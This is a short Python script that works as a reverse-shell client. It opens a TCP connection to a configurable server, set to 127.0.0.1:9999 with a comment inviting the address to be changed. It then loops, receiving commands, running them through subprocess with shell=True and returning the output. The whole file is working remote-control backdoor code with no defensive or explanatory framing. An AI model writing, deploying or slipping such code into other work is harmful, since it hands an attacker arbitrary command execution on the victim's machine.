import socket

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Update Server Address Here
    client.connect(('127.0.0.1', 9999))  
    
    print("[*] Connected to the server.")

    while True:
        try:
            # Receive the command from the server
            command = client.recv(1024).decode('utf-8')
            
            if not command:
                print("[*] Server closed the connection.")
                break

            if command.lower() == 'exit':
                print("[*] Server requested to close the connection.")
                break
            
            print(f"Command from server: {command}")
            
            # Execute the command
            result = execute_command(command)
            
            # Send the result back to the server
            client.send(result.encode('utf-8'))

        except (ConnectionResetError, BrokenPipeError):
            print("[*] Connection to server lost.")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            break

    client.close()

def execute_command(command):
    import subprocess
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return f"Command failed: {e.output.decode('utf-8')}"

if __name__ == "__main__":
    connect_to_server()
